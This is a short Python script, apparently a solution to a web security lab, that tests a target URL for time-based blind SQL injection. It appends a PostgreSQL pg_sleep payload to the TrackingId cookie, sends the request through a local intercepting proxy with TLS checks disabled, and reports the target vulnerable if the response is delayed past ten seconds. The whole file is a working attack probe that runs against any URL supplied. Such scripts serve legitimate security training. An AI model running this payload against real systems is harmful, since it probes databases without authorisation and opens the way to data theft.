import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'}

FAIL = -1

def is_vulnerable_to_time_based_sqli(url):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {
    'TrackingId': 'oC8yw5dTl4Yn2DmX' + sqli_payload_encoded,
    'session': 'RZ97NbdGZnadnHwZ7ty42R3x6VwayhR5'}
    response = requests.get(
        url, cookies=cookies,
        verify=False,
        proxies=proxies)
    return int(response.elapsed.total_seconds()) > 10

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        print("Checking if tracking cookie is vulnerable to time-based blind SQLi...")
        if is_vulnerable_to_time_based_sqli(url):
            print("[+] Vulnerable to blind-based SQL injection")
        else:
            print("(-) Not vulnerable to blind based SQL injection")
    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(FAIL)
    except Exception as exception:
        print("[-] An exception occured %s" % exception)
        print("[-] The SQLi attack was not successful.")
        sys.exit(FAIL) 